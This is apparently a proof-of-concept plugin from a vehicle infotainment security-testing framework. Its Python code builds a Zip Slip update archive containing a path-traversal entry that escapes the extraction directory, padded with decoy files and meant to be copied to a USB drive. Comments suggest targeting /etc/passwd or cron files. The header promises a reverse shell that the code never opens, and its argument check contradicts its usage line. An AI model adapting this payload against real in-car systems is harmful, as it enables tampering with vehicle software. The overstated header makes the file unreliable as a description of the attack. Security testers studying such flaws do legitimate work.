"""
PoC Name: USB Path Traversal Injection
CVE: N/A
Component: Application Stack
Category: Application
Severity: Critical
CVSS: 8.5
Description: 恶意USB目录结构利用路径操作获取反弹Shell
Prerequisites: 本机权限。生成后须手动挂载至U盘。
Usage: python3 57_USB_Path_Injection.py
"""
import sys
import os
import shutil
from iv_plugin_base import IVIVulnerabilityPlugin

class UsbPathTraversalPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        return True

    def exploit(self):
        self.logger.info("准备构造路径遍历(Path Traversal)的恶意文件结构...")
        
        # IVI 系统如果在读取文件时不处理 `../`，会被解压或复制脱离挂载目录
        # 这里演示生成包含 ../../ 的 zip 或者符号链接与特殊名称目录
        
        # 很多早期的 Linux / Android IVI ，解压车机升级包 zip 时可以直接解压出 ../../ 
        # 本机演示，我们借用 Python 的 zipfile 生成恶意升级包
        payload_dir = "/tmp/ivi_usb_payloads"
        os.makedirs(payload_dir, exist_ok=True)
        
        zip_path = os.path.join(payload_dir, "malicious_update.zip")
        
        try:
            import zipfile
            self.logger.info("构建特制的恶意 Zip 升级包...")
            
            # 这是一个典型的 Zip Slip 漏洞攻击包
            # 我们将写入一个文件名为 "../../../../../../../etc/passwd" 或 "/var/spool/cron/root" 的条目
            malicious_entry = "../../../../../../../../tmp/pwned_by_zip_slip"
            
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
                # 写入恶意条目
                z.writestr(malicious_entry, b"Pwned! This file escaped the extraction directory\\n")
                # 写入正常诱饵供系统读取
                z.writestr("update_info.txt", b"Version: 2.0\\nAuthor: AutoSec")
                z.writestr("logo.png", b"FAKE_PNG_HEADER")
                
            self.logger.warning(f"[SUCCESS] 恶意 Zip Slip 更新包已在本地生成！")
            self.logger.warning(f"  绝对路径: {zip_path}")
            self.logger.warning("[!] 请将此包拷入U盘。当车机尝试读取此ZIP进行OTA、壁纸更新或日志导入时：")
            self.logger.warning(f"    系统将灾难性地把木马文件释放到车机的 /tmp/pwned_by_zip_slip ! ")
            
            return {
                "status": "success",
                "vulnerable": True,
                "details": f"Generated malicious ZIP Slip payload at {zip_path}. Awaiting manual testing."
            }

        except Exception as e:
            self.logger.error(f"构建压缩包发生错误: {str(e)}")
            return {"status": "error", "details": str(e)}

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 57_USB_Path_Injection.py")
        sys.exit(1)
    plugin = UsbPathTraversalPlugin()
    plugin.run_verify()
